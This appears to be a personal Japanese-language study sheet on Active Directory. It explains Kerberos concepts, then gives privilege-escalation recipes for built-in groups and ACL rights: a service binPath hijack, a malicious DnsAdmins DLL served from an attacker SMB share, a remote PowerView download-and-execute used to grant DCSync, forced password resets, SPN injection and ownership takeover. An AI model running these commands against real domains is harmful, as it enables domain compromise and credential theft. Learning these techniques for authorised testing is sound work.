# Kerberos
Kerberos認証。Active Directoryで使われる認証でチケットを採用し、ハッシュ化したパスワードがネットワークに流れない。
1. TGTの取得  
AS_REQ: クライアントがKDCのASにTGTを要求。IDとAuthenticatorを送信。  
AS_REP: ASがAuthenticatorを検証して応答。  
ASがTGTとTGSセッションキーをクライアントへ送信。  
2. STの取得  
クライアントがKDCのTGSにサービスへのアクセスを要求。TGTとTGSセッションキーで暗号化したAuthenticator、アクセスしたいサービスのSPNを送信。  
TGSが要求を検証し、サービスチケット（SPNに紐づくアカウントのパスワードで暗号化）とサービスセッションキーをクライアントへ送信。
3. サービスの利用
クライアントがサービスへのアクセスを要求。サービスチケットとサービスセッションキーで暗号化したAuthenticatorを送信。  
サービスが検証し、アクセスを許可。
# Authenticator
タイムスタンプをNTハッシュで暗号化したもの。
# KDC
Key Distribution Center。TGTの発行と管理を行う。
# TGS
Ticket-Granting Server。サービスチケットの発行と管理を行う。
# DC
ドメインコントローラー。Active Directory Domain Servicesを実行しているサーバーであり、認証と認可を担っている。
# SPN
Service Principal Names。サービスを実行しているアカウント、もしくはコンピュータアカウントに紐づけられるもの。
# Kerberoasting
SPNが登録されているアカウントのパスワードハッシュを抜き取る攻撃手法。
# DCSync
DCのレプリケーションという情報同期昨日を悪用して全ユーザーのNTLMハッシュを取得する攻撃手法。  
DCに対して`GetChangesAll`, `GetChanges`の権限が必要。
# Group
## Server Operators
Windows ServerやActive Directory環境においてサーバーの運用管理に関する一定の権限を持つ、組み込みの特殊なセキュリティグループ。
### 権限昇格
サービスの起動、再起動、停止、設定変更は管理者権限で行われるため、これを悪用して権限昇格が可能。
```powershell
sc.exe config vss binPath= "<Command / File path>"
sc.exe stop vss
sc.exe start vss
```
## DnsAdmins
Active Directoryにデフォルトで存在する組み込みグループ。
### 権限昇格
DNSサーバーの設定を変更することで任意のDLLを読み込ませ、権限昇格が可能。
```
# kali
msfvenom -p windows/x64/exec cmd='net user administrator P@ssword123! /domain' -f dll > dnssetup.dll
impacket-smbserver share $(pwd) -smb2support
# Windows
Get-Service -Name DNS
dnscmd localhost /config /serverlevelplugindll \\<YOUR IP>\share\dnssetup.dll
reg.exe query "HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v ServerLevelPluginDll
sc.exe stop dns
sc.exe start dns
```
## Exchange Windows Permissions
Microsoft Exchangeをインストールした際に自動的に作成され、Active Directory内のユーザーオブジェクトに対して、必要な権限を付与するためのグループ。
### DCSync権限の付与
```
net user evil "Password123!" /add /domain
net group "Exchange Windows Permissions" evil /add /domain # 権限が必要
net localgroup "Remote Management Users" evil /add
# PowerView.ps1によるDCSync権限の付与
$pass = convertto-securestring '<パスワード>' -asplain -force
$cred = new-object system.management.automation.pscredential('<Domain>\<User>', $pass)
iex(new-object net.webclient)).downloadstring('<URL>')
Add-ObjectACL -PrincipalIdentity 'evil' -Credential $cred -Rights DCSync
```
## Cert Publishers
このグループのメンバーは、Active Directoryのユーザーオブジェクトの証明書を発行する権限を持つ。このグループの名前変更、削除はできない。

# Privilege
## WriteDACL
ACLの変更権限
## ReadGMSAPassword
GMSAアカウントのパスワードの読み取り権限
## AllowedToDelegate
DCにアクセスするユーザーのためのサービスチケットの要求権限
## GenericAll
パスワードを含むすべての属性の変更権限
## ForceChangePassword
以前のパスワードを知らずにパスワードを変更できる権限
### GenericAll, ForceChangePasswordを使用したパスワード変更
```powershell
$SecurePass = ConvertTo-SecureString "Password123!" -AsPlain -Force
Set-ADAccountPassword -Identity "<User>" -NewPassword $SecurePass -Reset
```
## GenericWrite
SPNを含む属性変更権限
### GenericWriteを使用したSPN付与
```powershell
$pass = convertto-securestring "<GenericWrite User Password>" -Asplain -Force
$cred = new-object system.management.automation.pscredential ("<Domain>\<GenericWrite User Password>", $pass)
Set-ADUser -Identity <SPNを付与するユーザー> -ServicePrincipalNames @{Add="<HTTP>/<anything>"} -Credential $cred # webサーバーに紐づくサービスアカウントにするためのSPNの付与
```
## GetChanges
属性読み取り権限
## GetChangesAll
すべての属性読み取り権限
## GetChangesInFilteredSet
フィルタリングされている属性読み取り権限
## WriteOwner
対象オブジェクトの所有者変更権限、所有者になるとそのオブジェクトのDACLを編集できる権限が付与される。
### WriteOwnerを使用した所有者変更からパスワード変更まで
```bash
# 所有者変更
bloodyAD -d <Domain> --dc-ip <IP> --dns <DNS IP> -u '<WriteOwner User>' -p '<Password>' set owner '<User>' '<WriteOwner User>'
# GenricAll権限付与
bloodyAD -d <Domain> --dc-ip <IP> -u '<WriteOwner User>' -p '<Password>' add genericAll '<User>' '<WriteOwner User>'
# DACL書き込み権限付与
impacket-dacledit -action 'write' -principal '<WriteOwner User>' -target '<User>' '<Domain>/<WriteOwner User>:<Password>'
# パスワード変更
bloodyAD -d <Domain> --dc-ip <IP> -u '<WriteOwner User>' -p '<Password>' set password '<User>' 'Password123!'
```

# SPNユーザー検索
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select Name, ServicePrincipalName # SPNを持つユーザー列挙
```
